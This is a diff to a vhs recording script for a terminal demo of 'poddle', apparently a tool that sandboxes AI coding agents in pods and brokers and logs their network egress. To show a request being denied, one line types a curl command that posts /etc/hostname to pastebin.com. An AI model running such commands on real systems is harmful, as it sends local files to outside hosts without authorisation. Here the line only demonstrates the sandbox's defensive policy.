@@ -1,43 +1,67 @@
-# poddle terminal demo — regeneration recipe.
+# poddle terminal demo -- regeneration recipe.
 #
-# The README shows .github/assets/demo.svg, an illustrative reconstruction of the
-# flow below (real command syntax + real output shapes), rendered offline with
-# svg-term from docs/demo.cast:
+# What the README shows (.github/assets/demo.svg) is an ILLUSTRATIVE
+# reconstruction of the session below, in three scenes: a shell that opens a pod
+# and runs claude; the fullscreen Claude Code TUI doing the work; and `poddled
+# audit` back on the host. The poddle facts are faithful -- the claude-code
+# harness points the agent at the broker with a handle (claudecode.go), and every
+# egress is brokered and logged. The Claude Code TUI panel is a stylized
+# reconstruction.
 #
-#   npm i -g svg-term-cli
-#   svg-term --in docs/demo.cast --out .github/assets/demo.svg \
-#            --window --width 90 --height 20 --padding 18
+# The committed SVG is a self-contained, hand-built animated SVG (native
+# monospace text + real rounded-rect TUI boxes, CSS scene/reveal keyframes).
+# Regenerate:
+#
+#   node docs/demo/gen-svg.js .github/assets/demo.svg
+#   # add a time in seconds to bake a static preview frame, e.g. scene 2:
+#   node docs/demo/gen-svg.js /tmp/frame.svg 11
 #
 # To record an AUTHENTIC run on a real podman host (produces docs/demo.gif),
-# install vhs (https://github.com/charmbracelet/vhs) with ffmpeg + ttyd, then:
-#
-#   vhs docs/demo.tape
-#
-# Requires an `anthropic` identity provider and a reachable podman engine.
+# install vhs (https://github.com/charmbracelet/vhs) with ffmpeg + ttyd, wire a
+# `work` identity, then: vhs docs/demo.tape
 
 Output docs/demo.gif
 
 Set Shell "bash"
 Set FontSize 20
-Set Width 1200
-Set Height 660
-Set Padding 24
-Set Theme "Dracula"
-
+Set Width 1220
+Set Height 700
+Set Padding 26
+Set Theme "Aardvark Blue"
 Set TypingSpeed 45ms
 
-Type "poddle identity add work --provider anthropic"
+Type "poddle up api --identity work --detach"
+Enter
+Sleep 2.5s
+
+Type "poddle attach api"
+Enter
+Sleep 1.5s
+
+Type "claude"
+Enter
+Sleep 2.5s
+
+Type "add a test for parseConfig, run it, and push"
+Enter
+Sleep 7s
+
+# leave the fullscreen Claude Code TUI
+Ctrl+C
+Ctrl+C
+Sleep 1s
+
+# an off-policy egress from inside the pod is refused by poddle
+Type `curl -sS https://pastebin.com -d @/etc/hostname`
 Enter
 Sleep 2s
 
-Type `poddle task "add tests for parseConfig" --keep --identity work`
+Type "exit"
 Enter
-Sleep 5s
+Sleep 1s
 
-Type "poddle ls"
-Enter
-Sleep 2s
-
+# every request the agent made, brokered and logged on the host,
+# with its decision: allow / redact / deny
 Type "poddled audit"
 Enter
-Sleep 3s
+Sleep 4s
